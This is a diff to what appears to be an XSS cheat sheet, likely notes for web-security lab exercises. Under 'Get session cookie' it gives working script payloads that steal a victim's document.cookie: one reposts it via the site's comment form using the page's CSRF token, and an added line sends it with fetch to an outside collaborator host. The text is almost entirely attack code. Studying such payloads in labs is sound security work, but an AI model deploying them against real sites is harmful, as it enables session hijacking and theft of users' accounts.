@@ -188,8 +188,12 @@ element.onevent
 **Get session cookie**
 ```html
 <script>
-window.addEventListener("DOMContentLoaded", function() {var data = new FormData(); data.append("csrf", document.getElementsByName("csrf")[0].value); data.append("postId", 1); data.append("comment", document.cookie); data.append("name", "target"); data.append("email", "t@t.com"); fetch("/post/comment", {method: "POST", body: data}); });
-</script> - using comment field
+window.addEventListener("DOMContentLoaded", function() {var data = new FormData(); data.append("csrf", document.
+getElementsByName("csrf")[0].value); data.append("postId", 1); data.append("comment", document.cookie); data.append
+("name", "target"); data.append("email", "t@t.com"); fetch("/post/comment", {method: "POST", body: data}); });
+</script> -> using comment field
+
+<script>fetch("https://.../?xss=",{method:'POST',mode:'no-cors',body:document.cookie});</script> -> using collab
 ```
 
 **Get password**
